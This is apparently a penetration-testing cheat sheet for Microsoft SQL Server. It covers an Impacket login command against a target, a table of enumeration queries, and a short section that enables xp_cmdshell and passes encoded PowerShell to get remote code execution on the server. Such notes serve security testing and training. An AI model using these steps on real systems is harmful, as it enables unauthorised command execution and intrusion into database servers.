# MSSQL

> [→ Service Library](CHEATSHEETS/LIBRARY/SERVICES/mssql.md)

<!-- token-exclude: PS -->

## Impacket mssqlclient.py

    python3 mssqlclient.py <USER>@<TARGET_IP> -windows-auth

## MSSQL Shell commands

| COMMAND | USAGE |
|---------|-------|
| `SELECT name FROM sys.databases;` | List all databases on the SQL Server instance. |
| `USE <database>; GO` | Switch the current session to the specified database. |
| `SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';` | List all user tables in the current database, including their schemas. |
| `SELECT name FROM sys.tables;` | List all user tables in the current database. |
| `EXEC sp_help '<table>';` | Display detailed information about a table. |
| `SELECT DB_NAME();` | Show the name of the current database. |
| `SELECT SUSER_NAME();` | Show the current login name. |
| `SELECT USER_NAME();` | Show the current database user. |
| `SELECT SYSTEM_USER;` | Show the current login account used for the session. |

## RCE through mssql

> ### Enable Command Shell
>
>     enable_xp_cmdshell

> ### Pass Powershell Code
>
>     xp_cmdshell powershell -e <PS>

## Tips

- Port: 1433
